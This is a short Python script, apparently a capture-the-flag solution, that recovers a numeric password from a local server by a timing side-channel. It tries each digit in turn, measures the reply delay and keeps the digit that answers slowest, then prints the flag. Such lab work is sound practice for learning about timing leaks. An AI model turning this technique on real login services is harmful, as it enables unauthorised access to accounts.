__author__ = 'David Wertenteil'
import socket as sck
import time

BUFF_SIZE = 1024


def recvall(sock):
    """
    Receive all data from the socket
    :param sock: The socket
    :return: String with the message
    """
    data = ''
    chunk = b'b'
    while chunk != b'':
        chunk = sock.recv(BUFF_SIZE)
        data += chunk.decode('utf-8')
    return data


# Set all 8 characters to be '/' that way we can check '0'
check_pass = ['/'] * 8
message = "Bad password!"
password = ''
max_time = 1

while message == "Bad password!":
    # Declaring a socket
    socket = sck.socket(sck.AF_INET, sck.SOCK_STREAM)
    # Connecting to server
    socket.connect(("127.0.0.1", 1234))
    # First message: Enter a password
    socket.recv(1024)

    # Sending the current password
    socket.send(str.encode(''.join(check_pass), 'utf-8'))

    # Check receiving time
    start_t = time.time()
    message = recvall(socket)
    end_t = time.time()

    if check_pass[len(password)] == '/':  # Next character
        max_time = abs(start_t - end_t) + 0.05  # Margin of error

    # Add digit to final password
    if max_time < abs(start_t - end_t):
        password += check_pass[len(password)]
    else:
        check_pass[len(password)] = chr(ord(check_pass[len(password)]) + 1)
    socket.close()

# Print the flag
print(message)
# print password
print()
